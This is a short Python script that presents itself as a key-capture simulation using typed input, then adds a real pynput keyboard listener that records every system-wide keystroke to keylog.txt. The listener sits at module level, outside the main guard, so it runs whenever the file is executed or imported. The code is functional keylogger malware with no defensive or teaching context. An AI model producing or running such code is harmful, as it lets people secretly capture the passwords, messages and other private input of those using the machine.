def simulate_key_capture():
    captured_keys = []
    print("Simulating key capture. Type 'exit' to stop.")
    while True:
        key = input("Key pressed: ")
        if key.lower() == "exit":
            break
        captured_keys.append(key)
    return captured_keys

def store_keys(keys, filename="captured_keys.txt"):
    try:
        with open(filename, "w") as file:
            for key in keys:
                file.write(key + "\n")
        print(f"Keys stored in {filename}")
    except Exception as e:
        print(f"Error storing keys: {e}")

if __name__ == "__main__":
    captured_keys = simulate_key_capture()
    if captured_keys:
        store_keys(captured_keys)

try:
    from pynput import keyboard

    def on_press(key):
        try:
            print('alphanumeric key {0} pressed'.format(key.char))
            with open("keylog.txt", "a") as f:
                f.write(str(key.char))
        except AttributeError:
            print('special key {0} pressed'.format(key))
            with open("keylog.txt", "a") as f:
                f.write(str(key))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except ImportError:
    print("pynput is not installed. please install it to run this code.")
